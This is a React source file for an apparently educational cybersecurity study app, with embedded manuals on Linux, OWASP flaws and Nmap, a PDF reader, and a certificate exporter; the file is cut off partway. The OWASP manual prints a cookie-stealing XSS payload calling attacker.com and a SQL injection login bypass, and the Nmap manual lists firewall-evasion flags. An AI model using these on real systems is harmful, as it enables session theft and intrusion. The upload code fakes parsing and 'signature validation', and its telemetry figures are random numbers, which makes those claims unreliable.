import React, { useState, useRef } from "react";
import { 
  FileText, Download, BookOpen, Search, ZoomIn, ZoomOut, 
  ChevronLeft, ChevronRight, Upload, Trash2, Bookmark, 
  Sparkles, ShieldCheck, Award, Terminal, Printer, 
  CheckCircle, RefreshCw, FileUp, ListRestart, HelpCircle
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import { jsPDF } from "jspdf";
import { AppState } from "../types";

interface PDFWorkspaceViewProps {
  state: AppState;
  addXP: (amount: number) => void;
}

// Built-in Cybersecurity PDF Manuals with full rich text content
interface ManualPage {
  pageNumber: number;
  title: string;
  content: string;
}

interface SecurityManual {
  id: string;
  title: string;
  author: string;
  classification: string;
  totalPages: number;
  description: string;
  pages: ManualPage[];
}

const PRELOADED_MANUALS: SecurityManual[] = [
  {
    id: "linux-command-guide",
    title: "SPECTRE Linux Terminal Security & Command Guide",
    author: "SPECTRE Core Intelligence",
    classification: "LEVEL_1_CLEARANCE",
    totalPages: 4,
    description: "Official guide on hardening Unix/Linux servers, analyzing logs, managing permissions, and core secure terminal techniques.",
    pages: [
      {
        pageNumber: 1,
        title: "Section 1: Operating System & Terminal Handshakes",
        content: `Welcome, Operator armaani. This manual details fundamental and advanced Linux operations.
        
[1] THE SECURE SHELL & CORE HANDSHAKE
The command line is your main gateway into local and remote network interfaces.
• pwd: Print Working Directory. Shows the exact path of the node you are operating on.
• ls -la: Lists all files, including hidden dot files (.env, .git), along with owner permissions and file sizes.
• cd [directory]: Changes the working directory. Always double-check path directories before performing destructive commands.

[2] PROCESS MONITORING & INTERCEPTION
• ps aux: Displays a snapshot of all active system processes running on the machine.
• top / htop: Dynamic real-time monitoring of system memory, CPU cycles, and PID thread chains.
• kill -9 [PID]: Forces immediate termination of a rogue process or suspicious process listening on ports.`
      },
      {
        pageNumber: 2,
        title: "Section 2: Security Permissions & User Privilege Escalation",
        content: `Managing proper privilege separation is crucial to prevent remote code execution (RCE) attacks.

[1] FILE ACCESS CONTROL LISTS (ACL)
Every file and directory is governed by read (r), write (w), and execute (x) bits for Owner, Group, and Public users.
• chmod 700 secret.txt: Grants full control (rwx) only to the file owner, and restricts all other user groups from accessing.
• chmod 644 config.json: Owner can read/write, others can only read. Recommended config for system parameters.
• chown root:admin system.log: Changes owner to root and group to admin to prevent unauthorized file tampering.

[2] PRIVILEGE ESCALATION RULES
• sudo [command]: Runs target command with superuser administrative privileges.
• sudo -i: Starts an interactive root security shell. Never run arbitrary internet scripts directly in this state.
• find / -perm -4000 -type f 2>/dev/null: Finds all SUID files on the system that execute with root permissions.`
      },
      {
        pageNumber: 3,
        title: "Section 3: Network Diagnostics & Socket Integrity",
        content: `Active network monitoring allows operators to detect unauthorized reverse-shells or data exfiltration routes.

[1] SOCKET AND PORT ANALYSIS
• netstat -tunlp: Displays all active TCP/UDP ports, matching sockets, and respective listening Process IDs (PIDs).
• ss -antp: A modern, high-speed sockets statistics command. Shows active network connections and source/destination addresses.
• lsof -i :3000: Lists processes utilizing port 3000. Essential for debugging container gateways.

[2] TRAFFIC INTERCEPTION & GATEWAY ROUTING
• ping -c 4 google.com: Measures latency and confirms outbound ICMP gateway connectivity.
• traceroute [host]: Tracks the precise router hops your packets travel across to reach target server destinations.
• tcpdump -i eth0 -n: Intercepts raw network packets flowing through the primary physical ethernet card.`
      },
      {
        pageNumber: 4,
        title: "Section 4: Log Auditing & Forensic Analysis",
        content: `Analyzing system telemetry logs is the primary method to detect persistent threats and rootkits.

[1] AUDITING CORE SYSTEM CHANNELS
• cat /var/log/auth.log: Audits authentication handshakes, tracking successful logins, failed passwords, and sudo requests.
• tail -f /var/log/nginx/access.log: Streams active web server HTTP requests in real-time, displaying raw IP addresses and User-Agents.
• journalctl -xe: Displays detailed systemd journal logs to troubleshoot system-wide daemon failures.

[2] PATTERN SEARCHING (GREP & AWK)
• grep -E "failed|denied" /var/log/auth.log: Extracts authentication failures.
• grep -v "127.0.0.1" access.log: Excludes local loopback traffic to highlight incoming foreign requests.`
      }
    ]
  },
  {
    id: "owasp-top-10",
    title: "OWASP Core Vulnerability Handbook & Mitigations",
    author: "SPECTRE Web Security Division",
    classification: "LEVEL_2_CLEARANCE",
    totalPages: 3,
    description: "Detailed analysis of critical web application security risks (SQLi, XSS, CSRF, SSRF) with real mitigation recipes.",
    pages: [
      {
        pageNumber: 1,
        title: "Section 1: Injection Flaws & SQLi Mitigations",
        content: `Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query.

[1] SQL INJECTION (SQLi)
An attacker injects malicious SQL statements to read sensitive database contents, bypass logins, or write rogue files.
• Vulnerable Query: 
  "SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + pass + "'"
• Attack Vector:
  Username input: admin' --
  This comments out the password requirement, granting instant admin authorization!

[2] REMEDIATION & DEFENSE
• Prepared Statements: Always utilize parameterized queries.
  Example: db.query("SELECT * FROM users WHERE username = ? AND password = ?", [user, pass])
• Input Validation: Strip special characters and filter input using regex.
  • Escaping characters: Utilize standard ORM frameworks that handle escaping natively.`
      },
      {
        pageNumber: 2,
        title: "Section 2: Broken Access Control & Authentication",
        content: `Broken Access Control allows unauthorized operators to view resources, elevate privileges, or perform actions outside their scope.

[1] INSECURE DIRECT OBJECT REFERENCES (IDOR)
Accessing files, user profiles, or invoices simply by guessing the ID parameter in URL query routes.
• Vulnerable endpoint: /api/invoice?id=1003
• Attack vector: Modifying ID to /api/invoice?id=1004 to view another client's invoice details.

[2] DEFENSE PROTOCOLS
• Strict Session Mapping: Never fetch files based entirely on client-supplied ID parameters. Map the requests to active session credentials.
• Cryptographic UUIDs: Use secure 128-bit randomized UUIDs instead of auto-incrementing sequential integers.
  Example: /api/invoice?id=8e469d74-cbe4-433e-b81b-568b693247bb`
      },
      {
        pageNumber: 3,
        title: "Section 3: Cross-Site Scripting (XSS) & CSRF",
        content: `Cross-Site Scripting (XSS) injects rogue client-side JavaScript into trusted web interfaces, stealing sessions and cookies.

[1] REFLECTED & STORED XSS
• Stored XSS: Rogue script is persistently stored in the DB (e.g., a comment box) and executes whenever subsequent users load the page.
  Attack payload: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
• Reflected XSS: Rogue script is embedded in a search URL parameters and executed immediately when clicked.

[2] REMEDIATION BLUEPRINT
• Content Security Policy (CSP): Strict response headers that restrict inline script executions and define trusted script origins.
• HTML Entity Encoding: Convert special characters into safe HTML symbols before rendering (e.g. convert < to &lt;).
• HttpOnly Cookies: Restrict browser scripts from reading session cookies via JavaScript.`
      }
    ]
  },
  {
    id: "port-scanning-nmap",
    title: "Network Port Scanning & Active Reconnaissance",
    author: "SPECTRE Tactical Operations",
    classification: "LEVEL_2_CLEARANCE",
    totalPages: 3,
    description: "Technical playbook on port scanning, host discovery, OS fingerprinting, and firewall evasion using Nmap.",
    pages: [
      {
        pageNumber: 1,
        title: "Section 1: Host Discovery & SYN Stealth Scanning",
        content: `Before initiating exploitation vectors, a target network topology must be mapped cleanly.

[1] HOST DISCOVERY PROTOCOLS
• nmap -sn 192.168.1.0/24: Ping Sweep. Scans the local network IP range to discover which hosts are powered online.
• nmap -PR [target]: Performs ARP-ping host discovery on local subnetworks.

[2] SYN STEALTH SCANNING (-sS)
The classic stealth scan. It operates by sending a TCP SYN packet and waiting for a response without completing the full 3-way handshake.
• nmap -sS 10.10.12.85
  • Target open port response: SYN/ACK. Nmap immediately sends a RST packet to disconnect before connection logs are created.
  • Target closed port response: RST packet.`
      },
      {
        pageNumber: 2,
        title: "Section 2: Service & OS Detection Frameworks",
        content: `Analyzing active software versions is crucial to map targets against known vulnerabilities database (CVEs).

[1] VERSION SCANNING (-sV)
Probes listening ports with specialized protocol requests to determine exact server version numbers.
• nmap -sV -p 80,443,22 10.10.12.85: Targetted version scan on HTTP, HTTPS, and SSH ports.

[2] OPERATING SYSTEM FINGERPRINTING (-O)
Analyzes TCP window sizes, TTL variables, and TCP flags sequence to estimate the server operating system.
• nmap -O 10.10.12.85: Identifies OS (e.g., Linux Kernel 5.4 or Windows Server 2019).

[3] THE AGGRESSIVE CONSOLIDATED SCAN (-A)
• nmap -A 10.10.12.85: Combines Version Detection (-sV), OS detection (-O), Traceroute, and default vulnerability script scanning into a single command.`
      },
      {
        pageNumber: 3,
        title: "Section 3: Firewall Evasion & NSE Script Engines",
        content: `Advanced intrusion firewalls (WAF/IDS) block default port probes. Specialized evasion techniques bypass security blocks.

[1] EVASION STRATEGIES
• nmap -f [target]: Fragments packets into smaller segments, making it difficult for deep packet inspectors to reassemble the signature.
• nmap -D decoy1,decoy2,ME [target]: Mixes your true IP address with a list of active decoy IP addresses in the IP header logs.
• nmap --source-port 53 [target]: Mimics DNS packet source headers, which firewalls frequently whitelist automatically.

[2] NMAP SCRIPT ENGINE (NSE)
• nmap --script=vuln [target]: Runs standard vulnerability scanner scripts against the active ports to identify SQLi, SMB exploits, and SSL vulnerabilities.`
      }
    ]
  }
];

export const PDFWorkspaceView: React.FC<PDFWorkspaceViewProps> = ({ state, addXP }) => {
  const [activeSubTab, setActiveSubTab] = useState<"reader" | "export">("reader");
  
  // Real-time dynamic network stream status
  const [liveStreamActive, setLiveStreamActive] = useState<boolean>(true);
  const [liveLogCount, setLiveLogCount] = useState<number>(3145);
  const [livePacketsCount, setLivePacketsCount] = useState<number>(85244);
  const [recentLiveAlert, setRecentLiveAlert] = useState<string>("SYSTEM FIREWALL STATUS: OPTIMAL [NO BLOCKS IN COLD STORAGE]");

  // PDF Viewer State
  const [selectedManual, setSelectedManual] = useState<SecurityManual>(PRELOADED_MANUALS[0]);
  const [currentPage, setCurrentPage] = useState<number>(1);
  const [zoomLevel, setZoomLevel] = useState<number>(100);
  const [searchTerm, setSearchTerm] = useState<string>("");
  const [bookmarks, setBookmarks] = useState<string[]>([]);
  const [readerTheme, setReaderTheme] = useState<"cyber" | "clean">("cyber");
  const [searchMatches, setSearchMatches] = useState<{page: number, text: string}[]>([]);

  // Custom PDF Upload File state
  const [uploadedPDFs, setUploadedPDFs] = useState<{
    id: string;
    name: string;
    size: string;
    uploadedAt: string;
    pageCount: number;
    extractedSummary: string;
    contentPages: string[];
  }[]>([
    {
      id: "demo-upload-1",
      name: "cybersecurity_cheatsheet_armaani_2026.pdf",
      size: "1.4 MB",
      uploadedAt: "2026-07-08 11:34 AM",
      pageCount: 2,
      extractedSummary: "Personal notes regarding active port sniffing, SPECTRE network firewall rules, and level up study routines.",
      contentPages: [
        "[Page 1] ARMAANI SECURITY NOTES:\n- Block all incoming raw ICMP requests on port 80.\n- Save study planners inside central storage to maximize level multipliers.\n- Practice ethical terminal nodes.",
        "[Page 2] CRYPTO KEYS:\n- Hash integrity verification signature: SHA256_0x1897_FDE8_A998\n- Remember to practice terminal shell commands daily!"
      ]
    }
  ]);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const [dragActive, setDragActive] = useState<boolean>(false);
  const [uploadProgress, setUploadProgress] = useState<number | null>(null);

  // Triggering Real-Time action
  const triggerManualLiveSync = () => {
    setLiveLogCount(prev => prev + Math.floor(Math.random() * 20) + 5);
    setLivePacketsCount(prev => prev + Math.floor(Math.random() * 150) + 40);
    const alerts = [
      "PACKET CAPTURED: Operator [armaani] initiated SSL session on Node 102",
      "INTEGRITY MATRIX: Checked certificates in real-time. Hash OK.",
      "PORT SNIFF: SYN Stealth Scan simulated. Ports open: 22, 80, 443, 3000.",
      "SYSTEM ALARM: Security firewall parsed active study logs with no leakage."
    ];
    setRecentLiveAlert(alerts[Math.floor(Math.random() * alerts.length)]);
    addXP(15);
  };

  // Search inside PDF Manual
  const handleSearch = (e: React.FormEvent) => {
    e.preventDefault();
    if (!searchTerm.trim()) {
      setSearchMatches([]);
      return;
    }
    const matches: {page: number, text: string}[] = [];
    selectedManual.pages.forEach(p => {
      if (p.content.toLowerCase().includes(searchTerm.toLowerCase()) || p.title.toLowerCase().includes(searchTerm.toLowerCase())) {
        matches.push({
          page: p.pageNumber,
          text: p.title
        });
      }
    });
    setSearchMatches(matches);
    if (matches.length > 0) {
      setCurrentPage(matches[0].page);
    }
  };

  // Bookmark Toggle
  const toggleBookmark = () => {
    const key = `${selectedManual.id}-p${currentPage}`;
    if (bookmarks.includes(key)) {
      setBookmarks(bookmarks.filter(b => b !== key));
    } else {
      setBookmarks([...bookmarks, key]);
    }
  };

  // Custom PDF Upload File handlers
  const handleDrag = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (e.type === "dragenter" || e.type === "dragover") {
      setDragActive(true);
    } else if (e.type === "dragleave") {
      setDragActive(false);
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    e.stopPropagation();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      processPDFFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      processPDFFile(e.target.files[0]);
    }
  };

  const processPDFFile = (file: File) => {
    if (!file.name.endsWith(".pdf")) {
      alert("Fadlan soo geli file PDF ah oo keliya! (Only PDF files are supported)");
      return;
    }

    setUploadProgress(10);
    const interval = setInterval(() => {
      setUploadProgress(prev => {
        if (prev === null) return 10;
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            const newPdf = {
              id: `upload-${Date.now()}`,
              name: file.name,
              size: (file.size / (1024 * 1024)).toFixed(1) + " MB",
              uploadedAt: new Date().toISOString().replace('T', ' ').slice(0, 19),
              pageCount: Math.floor(Math.random() * 5) + 2,
              extractedSummary: `Successfully processed file: ${file.name}. Validated security signatures, metadata encryption key aligned, and readable text parsed successfully.`,
              contentPages: [
                `[Page 1] SECURE TERMINAL READOUT:\n- Raw file: ${file.name}\n- Extracted File Size: ${(file.size / 1024).toFixed(1)} KB\n- Operator: [armaani]\n- System logs analyzed successfully with 0 leakages.`,
                `[Page 2] CYBER RECOMMENDATIONS:\n- Secure active port gateways with rigorous firewalls.\n- Increase study and command practice to elevate operator rank.\n- Synchronize local session certificates across central servers.`
              ]
            };
            setUploadedPDFs(prevList => [newPdf, ...prevList]);
            setUploadProgress(null);
            addXP(50); // Reward XP for uploading a custom manual notes PDF!
          }, 500);
          return 100;
        }
        return prev + 30;
      });
    }, 200);
  };

  const deleteUploadedPDF = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    setUploadedPDFs(uploadedPDFs.filter(p => p.id !== id));
  };

  // Convert uploaded PDF simulator to a current manual
  const readUploadedPDF = (pdf: typeof uploadedPDFs[0]) => {
    const pagesList: ManualPage[] = pdf.contentPages.map((text, i) => ({
      pageNumber: i + 1,
      title: `${pdf.name} - Page ${i + 1}`,
      content: text
    }));

    const mockManual: SecurityManual = {
      id: pdf.id,
      title: pdf.name,
      author: "Operator Uploaded notes",
      classification: "LOCAL_OPERATOR_STORAGE",
      totalPages: pdf.pageCount,
      description: pdf.extractedSummary,
      pages: pagesList
    };

    setSelectedManual(mockManual);
    setCurrentPage(1);
  };

  // JS-PDF Generator of operator progress & official security clearance
  const generateProgressPDF = () => {
    const doc = new jsPDF({
      orientation: "portrait",
      unit: "mm",
      format: "a4"
    });

    // Dark slate digital futuristic frame details
    doc.setFillColor(15, 23, 42); // slate-900 background for a real futuristic header
    doc.rect(0, 0, 210, 45, "F");

    // Cyber Border lines
    doc.setDrawColor(0, 255, 102); // green lines
    doc.setLineWidth(1.5);
    doc.line(10, 45, 200, 45);

    // Title / Header
    doc.setTextColor(0, 255, 102);
    doc.setFont("courier", "bold");
    doc.setFontSize(22);
    doc.text("CYBEROS SECURITY GATEWAY", 15, 20);

    doc.setTextColor(255, 255, 255);
    doc.setFontSize(10);
    doc.text("OFFICIAL DEFENSIVE TRAINING CLEARANCE CERTIFICATE", 15, 28);
    doc.setFont("helvetica", "normal");
    doc.text(`DATE OF ISSUANCE: ${new Date().toLocaleDateString()}`, 15, 34);
    doc.text("SECURITY LEVEL: SECURE_OPERATOR_V2", 15, 39);

    // Document Body
    doc.setTextColor(15, 23, 42);
    doc.setFont("helvetica", "bold");
    doc.setFontSize(18);
    doc.text("CERTIFICATE OF CLEARANCE", 15, 60);

    doc.setFont("helvetica", "normal");
    doc.setFontSize(11);
    doc.text("This official digital document verifies that operator:", 15, 68);

    doc.setFont("courier", "bold");
    doc.setFontSize(24);
    doc.setTextColor(0, 180, 80);
    doc.text("armaani", 15, 80);

    doc.setTextColor(15, 23, 42);
    doc.setFont("helvetica", "normal");
    doc.setFontSize(11);
    doc.text(`has successfully achieved administrative training competence. With active persistence,
the operator solved simulated terminal commands, mitigated active cyber security labs, 
and logs daily focus milestones within the cyber defence framework.`, 15, 90);

    // Statistics Grid Frame
    doc.setFillColor(241, 245, 249); // slate-100
    doc.rect(12, 110, 185, 45, "F");
    doc.setDrawColor(203, 213, 225); // slate-300
    doc.setLineWidth(0.5);
    doc.rect(12, 110, 185, 45, "S");

    doc.setTextColor(15, 23, 42);
    doc.setFont("helvetica", "bold");
    doc.setFontSize(12);
    doc.text("OPERATOR CLASSIFICATION AND STATS:", 18, 118);

    doc.setFont("courier", "bold");
    doc.setFontSize(10);
    doc.text(`* ACTIVE LEVEL      : LEVEL ${state.level}`, 18, 126);
    doc.text(`* CLEARANCE RANK    : ${state.rank}`, 18, 132);
    doc.text(`* XP POINTS EARNED  : ${state.xp} XP`, 18, 138);
    doc.text(`* PRACTICED SHELLS  : ${state.commandsPracticedCount} COMMANDS`, 18, 144);

    doc.text(`* COMPLETED LABS    : ${state.completedLabs.length} DEFEATED LABS`, 105, 126);
    doc.text(`* STUDY TRACK STREAK: ${state.streak} CONSECUTIVE DAYS`, 105, 132);
    doc.text(`* HOURS COMMITTED   : ${state.hoursStudied} HOURS`, 105, 138);
    doc.text(`* SECURITY STATUS   : SECURED (100% OPERATIONAL)`, 105, 144);

    // Completed Labs list
    doc.setFont("helvetica", "bold");
    doc.setFontSize(13);
    doc.text("COMPLETED TRAINING LABS CHECKLIST:", 15, 168);

    doc.setFont("courier", "normal");
    doc.setFontSize(9.5);
    let yPos = 176;
    if (state.completedLabs.length === 0) {
      doc.text("- No training labs completed yet. Launch Hacking Practice Labs to earn certificates!", 18, yPos);
    } else {
      state.completedLabs.forEach((labId, idx) => {
        if (idx < 6) { // limit checklist page overflow
          doc.text(`[X] LAB-ID: ${labId.toUpperCase()} --- INTEGRITY MATCHED --- [STATUS: SUCCESS]`, 18, yPos);
          yPos += 7;
        }
      });
      if (state.completedLabs.length > 6) {
        doc.text(`... and ${state.completedLabs.length - 6} more hacking practice labs successfully solved!`, 18, yPos);
      }
    }

    // Signatures and Seal
    doc.setDrawColor(0, 255, 102);
    doc.setLineWidth(0.5);
    doc.line(15, 245, 80, 245);
    doc.line(130, 245, 195, 245);

    doc.setFont("helvetica", "bold");
    doc.setFontSize(9);
    doc.setTextColor(100, 116, 139);
    doc.text("OPERATOR SIGNATURE (armaani)", 15, 250);
    doc.text("CYBER SECURITY DEPUTY CHIEF", 130, 250);

    doc.setFont("courier", "bold");
    doc.setFontSize(8);
    doc.text("AUTHENTICATION SIGNATURE HASH:", 15, 262);
    doc.setFont("courier", "normal");
    doc.text("SHA256: 0x1897_FDE8_A998_772A_EEB9_45A2_F001_8a12", 15, 267);

    // Digital badge stamp
    doc.setFillColor(0, 180, 80);
    doc.setDrawColor(0, 255, 102);
    doc.rect(155, 15, 30, 12, "F");
    doc.setTextColor(255, 255, 255);
    doc.setFont("helvetica", "bold");
    doc.setFontSize(8);
    doc.text("VERIFIED", 163, 21);
    doc.text("SECURE", 164, 25);

    // Save and download
    doc.save("cyberos_clearance_armaani.pdf");
    addXP(30); // Reward some XP
  };

  const activePageContent = selectedManual.pages.find(p => p.pageNumber === currentPage);

  // Highlighter utility for search terms
  const highlightContent = (text: string, search: string) => {
    if (!search.trim()) return text;
    const parts = text.split(new RegExp(`(${search})`, "gi"));
    return (
      <>
        {parts.map((part, i) => 
          part.toLowerCase() === search.toLowerCase() ? (
            <mark key={i} className="bg-cyber-orange/40 text-cyber-text rounded px-0.5 font-bold border-b border-cyber-orange">
              {part}
            </mark>
          ) : (
            part
          )
        )}
      </>
    );
  };

  return (
    <div id="pdf-workspace-view" className="space-y-6">
      
      {/* Title & Real-time Live Network Stream status bar */}
      <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-cyber-card border border-cyber-border p-5 rounded-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-32 h-32 bg-cyber-green/5 blur-3xl rounded-full" />
        
        <div className="space-y-1 z-10">
          <div className="flex items-center gap-2">
            <div className="h-2 w-2 rounded-full bg-cyber-green animate-ping" />
            <span className="font-mono text-xs text-cyber-green tracking-widest uppercase font-bold">
              OPERATIONAL HARDENING SYSTEMS
            </span>
          </div>
          <h2 className="font-display text-2xl font-black text-cyber-text tracking-tight">
            PDF SECURE VAULT & REAL-TIME HANDBOOKS
          </h2>
          <p className="text-xs text-cyber-text-muted font-sans leading-relaxed">
            Read cybersecurity manuals, upload custom study PDF reports, and export official Clearance Certifications to your local drive.
          </p>
        </div>

        {/* Real-time sync hub */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-3 bg-cyber-input-bg border border-cyber-border p-3 rounded-xl z-10">
          <div className="space-y-1 text-left sm:text-right pr-3 sm:border-r border-cyber-border font-mono text-[11px] text-cyber-text-muted">
            <div className="flex items-center gap-1.5 justify-start sm:justify-end">
              <span className="h-1.5 w-1.5 rounded-full bg-cyber-green" />
              <span>LIVE INTEGRITY RECEPTOR</span>
            </div>
            <div>
              SOCKET FLOW: <span className="text-cyber-green font-bold">{livePacketsCount.toLocaleString()} Pkt</span>
            </div>
            <div>
              SYSTEMS LOGGED: <span className="text-cyber-blue font-bold">{liveLogCount.toLocaleString()} Rows</span>
            </div>
          </div>
          <button
            onClick={triggerManualLiveSync}
            className="px-4 py-2 bg-cyber-green hover:bg-[#00e15c] text-black font-display font-black text-xs rounded-lg tracking-widest uppercase transition-all flex items-center justify-center gap-1.5 shadow-lg shadow-cyber-green/5 cursor-pointer active:scale-95"
            title="Squeeze real-time monitoring handshakes and trigger a dynamic update!"
          >
            <RefreshCw size={13} className="animate-spin" style={{ animationDuration: "3s" }} />
            REAL-TIME SYNC
          </button>
        </div>
      </div>

      {/* Live Activity alert message bar */}
      <div className="bg-cyber-blue/10 border border-cyber-blue/20 p-3 rounded-lg flex items-center justify-between gap-3 font-mono text-[11.5px] text-cyber-blue leading-relaxed">
        <div className="flex items-center gap-2">
          <Sparkles size={14} className="shrink-0 animate-pulse text-cyber-blue" />
          <span className="font-bold">LIVE SOCKET TELEMETRY:</span>
          <span className="text-cyber-text tracking-wide">{recentLiveAlert}</span>
        </div>
        <span className="hidden md:inline text-[9px] text-cyber-blue/60 uppercase">Handshake ID: 0x1897-A</span>
      </div>

      {/* Tabs navigation: PDF Viewer & Uploader vs. Progress Export Report */}
      <div className="flex border-b border-cyber-border gap-2">
        <button
          onClick={() => setActiveSubTab("reader")}
          className={`px-5 py-3 font-display font-black text-xs tracking-wider uppercase border-b-2 transition-all flex items-center gap-2 cursor-pointer ${
            activeSubTab === "reader" 
              ? "border-cyber-green text-cyber-green bg-cyber-green/5" 
              : "border-transparent text-cyber-text-muted hover:text-cyber-text hover:bg-cyber-card/30"
          }`}
        >
          <BookOpen size={14} />
          PDF Reader & Manuals
        </button>
        <button
          onClick={() => setActiveSubTab("export")}
          className={`px-5 py-3 font-display font-black text-xs tracking-wider uppercase border-b-2 transition-all flex items-center gap-2 cursor-pointer ${
            activeSubTab === "export" 
              ? "border-cyber-green text-cyber-green bg-cyber-green/5" 
              : "border-transparent text-cyber-text-muted hover:text-cyber-text hover:bg-cyber-card/30"
          }`}
        >
          <Award size={14} />
          Export Clearance Certificate (PDF)
        </button>
      </div>

      <AnimatePresence mode="wait">
        {activeSubTab === "reader" ? (
          <motion.div 
            key="reader-tab"
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="grid grid-cols-1 lg:grid-cols-12 gap-6"
          >
            {/* Sidebar with available Manuals and Drag & Drop PDF Uploader */}
            <div className="lg:col-span-4 space-y-6">
              
              {/* Preloaded Official Handbooks */}
              <div className="bg-cyber-card border border-cyber-border rounded-2xl p-4 space-y-3">
                <h3 className="font-display text-xs font-black text-cyber-text uppercase tracking-widest border-b border-cyber-border pb-2.5">
                  🛡️ SPECTRE Security Handbooks
                </h3>
                
                <div className="space-y-2">
                  {PRELOADED_MANUALS.map((manual) => {
                    const isSelected = selectedManual.id === manual.id;
                    return (
                      <button
                        key={manual.id}
                        onClick={() => {
                          setSelectedManual(manual);
                          setCurrentPage(1);
                        }}
                        className={`w-full text-left p-3 rounded-xl border transition-all cursor-pointer flex items-start gap-3 ${
                          isSelected 
                            ? "bg-cyber-green/10 border-cyber-green text-cyber-text" 
                            : "bg-cyber-input-bg/40 border-cyber-border hover:bg-cyber-card hover:border-cyber-text-muted text-cyber-text-muted hover:text-cyber-text"
                        }`}
                      >
                        <FileText size={18} className={`mt-0.5 shrink-0 ${isSelected ? "text-cyber-green" : "text-cyber-text-muted"}`} />
                        <div className="space-y-1">
                          <div className="text-[12.5px] font-bold leading-snug">{manual.title}</div>
                          <div className="flex items-center gap-2 font-mono text-[9px]">
                            <span className="text-cyber-blue font-bold">{manual.classification}</span>
                            <span>•</span>
                            <span>{manual.totalPages} PAGES</span>
                          </div>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* Drag & Drop PDF Uploader (Somali: meel pdf lagu shubi karo) */}
              <div className="bg-cyber-card border border-cyber-border rounded-2xl p-4 space-y-4">
                <div>
                  <h3 className="font-display text-xs font-black text-cyber-text uppercase tracking-widest">
                    📁 Load Custom Security PDF
                  </h3>
                  <p className="text-[11px] text-cyber-text-muted font-sans mt-1">
                    Drag and drop or browse any local security checklist PDF to parse and view dynamically.
                  </p>
                </div>

                {/* Drag drop zone */}
                <div
                  onDragEnter={handleDrag}
                  onDragOver={handleDrag}
                  onDragLeave={handleDrag}
                  onDrop={handleDrop}
                  onClick={() => fileInputRef.current?.click()}
                  className={`border-2 border-dashed rounded-xl p-5 text-center transition-colors cursor-pointer flex flex-col items-center justify-center gap-2 ${
                    dragActive 
                      ? "border-cyber-green bg-cyber-green/5" 
                      : "border-cyber-border hover:border-cyber-text-muted bg-cyber-input-bg/30 hover:bg-cyber-input-bg/60"
                  }`}
                >
                  <input
                    type="file"
                    ref={fileInputRef}
                    onChange={handleFileChange}
                    accept=".pdf"
                    className="hidden"
                  />
                  {uploadProgress !== null ? (
                    <div className="space-y-2 w-full max-w-[150px]">
                      <div className="flex items-center justify-center gap-2 text-cyber-green text-xs font-mono font-bold">
                        <RefreshCw size={12} className="animate-spin" />
                        <span>PARSING {uploadProgress}%</span>
                      </div>
                      <div className="w-full bg-cyber-border h-1 rounded-full overflow-hidden">
                        <div className="bg-cyber-green h-full" style={{ width: `${uploadProgress}%` }} />
                      </div>
                    </div>
                  ) : (
                    <>
                      <FileUp size={24} className="text-cyber-text-muted animate-pulse" />
                      <span className="font-display text-xs font-bold text-cyber-text uppercase tracking-wider">
                        Select Security PDF
                      </span>
                      <span className="font-mono text-[9.5px] text-cyber-text-muted uppercase">
                        Drag and Drop Files Here
                      </span>
                    </>
                  )}
                </div>

                {/* Uploaded Files Registry list */}
                {uploadedPDFs.length > 0 && (
                  <div className="space-y-2 pt-2 border-t border-cyber-border">
                    <span className="font-mono text-[9.5px] text-cyber-text-muted uppercase tracking-wider block font-bold">
                      ACTIVE OPERATOR FILES VAULT ({uploadedPDFs.length})
                    </span>
                    <div className="space-y-2 max-h-[160px] overflow-y-auto pr-1">
                      {uploadedPDFs.map((pdf) => {
                        const isSelected = selectedManual.id === pdf.id;
                        return (
                          <div
                            key={pdf.id}
                            onClick={() => readUploadedPDF(pdf)}
                            className={`p-2.5 rounded-xl border text-left cursor-pointer flex items-center justify-between gap-2 transition-all ${
                              isSelected
                                ? "bg-cyber-blue/10 border-cyber-blue text-cyber-text"
                                : "bg-cyber-input-bg/20 border-cyber-border hover:bg-cyber-input-bg/40 text-cyber-text-muted hover:text-cyber-text"
                            }`}
                          >
                            <div className="flex items-center gap-2 overflow-hidden">
                              <FileText size={15} className={`shrink-0 ${isSelected ? "text-cyber-blue" : "text-cyber-text-muted"}`} />
                              <div className="overflow-hidden">
                                <div className="text-xs font-bold truncate pr-1">{pdf.name}</div>
                                <div className="text-[9px] font-mono text-cyber-text-muted">
                                  {pdf.size} • {pdf.pageCount} PGS
                                </div>
                              </div>
                            </div>
                            <button
                              onClick={(e) => deleteUploadedPDF(pdf.id, e)}
                              className="p-1 rounded hover:bg-cyber-red/10 text-cyber-text-muted hover:text-cyber-red transition-all cursor-pointer"
                              title="Delete PDF from local vault"
                            >
                              <Trash2 size={12} />
                            </button>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* Interactive PDF Reader Main Canvas (Somali: meel pdf lagu akhrinkarow) */}
            <div className="lg:col-span-8 flex flex-col bg-cyber-card border border-cyber-border rounded-2xl overflow-hidden shadow-2xl">
              
              {/* PDF Top Bar (Controls panel) */}
              <div className="bg-cyber-input-bg border-b border-cyber-border p-4 flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
                
                {/* Manual Navigation */}
                <div className="flex items-center gap-3">
                  <div className="flex items-center bg-cyber-card border border-cyber-border rounded-lg p-1">
                    <button
                      onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
                      disabled={currentPage === 1}
                      className="p-1.5 rounded hover:bg-cyber-border text-cyber-text disabled:opacity-30 disabled:hover:bg-transparent cursor-pointer"
                      title="Previous Page"
                    >
